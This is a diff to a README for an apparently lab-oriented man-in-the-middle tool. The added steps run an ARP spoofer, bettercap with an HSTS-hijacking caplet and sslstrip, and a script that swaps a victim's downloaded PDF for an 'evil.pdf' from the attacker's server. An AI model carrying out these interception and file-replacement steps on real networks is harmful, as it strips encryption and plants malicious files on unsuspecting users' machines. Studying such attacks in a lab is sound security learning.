@@ -4,8 +4,7 @@
 
 * Root access
 * Python 3
-* Scapy
-* NetfilterQueue
+* Scapy and NetfilterQueue modules
 
 ## Usage
 
@@ -21,7 +20,33 @@ optional arguments:
   -u URL, --url URL     Specify a replace url
 ```
 
+## Kicking the tyres
+
+* Choose what type of file to replace, and make sure you have a replacement file in /var/www/html/evil/
+* Run the [arp_spoofer.py script](/arp_spoofer)
+
+```shell
+@kali:~$ sudo python3 arp_spoofer.py
+[sudo] password for <user>: 
+[+] Setting forward
+[+] Packets sent: 63
+```
+* Run `bettercap` (also see the Troubleshooting section below)
+
+```shell
+@kali:~$ sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
+```
+* Run the `file_interceptor.py` script. Defaults are set to replace a .pdf with an evil.pdf file in the `/var/www/html/evil/` location of the Kali `apache2` server on the Kali VM, and using `sslstrip`.
+
+```shell
+@kali:~$ sudo python3 file_interceptor.py 
+```
+And test file is replaced on Windows machine.
+
 ## Troubleshooting
 
 * [ImportError on NetfilterQueue](https://github.com/tymyrddin/ymrir/wiki/netfilterqueue.md)
 * [ImportError on Scapy](https://github.com/tymyrddin/ymrir/wiki/scapy.md)
+* [Bettercap sslstrip not working](https://github.com/tymyrddin/ymrir/wiki/bettercap.md)
+* [Undesired HTTPS redirects](https://github.com/tymyrddin/ymrir/wiki/https-browser.md)
+* [Correctly configured HSTS](https://github.com/tymyrddin/ymrir/wiki/hsts.md)
